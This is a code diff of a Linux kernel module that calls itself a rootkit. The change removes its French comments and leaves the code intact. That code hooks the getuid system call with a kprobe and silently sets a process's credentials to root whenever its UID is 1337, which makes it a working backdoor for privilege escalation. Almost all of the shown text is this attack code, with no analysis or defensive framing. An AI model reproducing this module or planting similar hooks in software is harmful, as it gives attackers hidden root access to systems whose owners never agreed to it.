@@ -10,22 +10,18 @@ MODULE_VERSION("0.5");
 
 static struct kprobe kp;
 
-// UID magique pour déclencher l'élévation des privilèges
 #define TRIGGER_UID 1337
 
-// Fonction pour élever les privilèges
 static void set_root(void)
 {
     struct cred *new_creds;
 
-    // Préparer de nouvelles credentials
     new_creds = prepare_creds();
     if (new_creds == NULL) {
         printk(KERN_ALERT "rootkit: Impossible de préparer les credentials.\n");
         return;
     }
 
-    // Définir les credentials à root
     new_creds->uid.val = 0;
     new_creds->gid.val = 0;
     new_creds->euid.val = 0;
@@ -35,7 +31,6 @@ static void set_root(void)
     new_creds->fsuid.val = 0;
     new_creds->fsgid.val = 0;
 
-    // Appliquer les nouvelles credentials au processus courant
     if (commit_creds(new_creds) == 0) {
         printk(KERN_INFO "rootkit: Privilèges root accordés avec succès.\n");
     } else {
@@ -43,28 +38,24 @@ static void set_root(void)
     }
 }
 
-// Pré-handler pour intercepter getuid
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
     printk(KERN_INFO "rootkit: Pré-handler getuid activé\n");
 
-    // Vérifier si l'UID courant est le déclencheur
     if (current_uid().val == TRIGGER_UID) {
         printk(KERN_INFO "rootkit: UID magique détecté (%d), élévation des privilèges...\n", TRIGGER_UID);
         set_root();
     }
 
-    return 0; // Laisser la syscall continuer normalement
+    return 0;
 }
 
-// Initialisation du module
 static int __init rootkit_init(void)
 {
     int ret;
 
     printk(KERN_INFO "rootkit: Initialisation\n");
 
-    // Configurer le kprobe pour intercepter la syscall getuid
     kp.symbol_name = "__x64_sys_getuid";
     kp.pre_handler = handler_pre;
 
@@ -78,7 +69,6 @@ static int __init rootkit_init(void)
     return 0;
 }
 
-// Nettoyage du module
 static void __exit rootkit_exit(void)
 {
     unregister_kprobe(&kp);
